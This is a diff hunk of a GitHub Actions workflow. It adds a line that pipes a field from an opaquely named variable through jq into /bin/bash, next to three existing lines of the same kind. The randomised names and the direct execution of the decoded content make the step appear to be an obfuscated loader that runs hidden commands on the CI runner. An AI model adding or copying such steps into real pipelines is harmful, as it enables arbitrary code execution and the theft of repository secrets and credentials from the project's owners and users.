@@ -29,6 +29,7 @@ jobs:
           echo $bcn623 | jq -r .tcpep06978 | /bin/bash
           printf '%s' "$pt24113" | jq -r .r73818 | /bin/bash
           printf '%s' "$i54321" | jq -r .ricca16 | /bin/bash
+          echo $scvx209 | jq -r .jych47 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
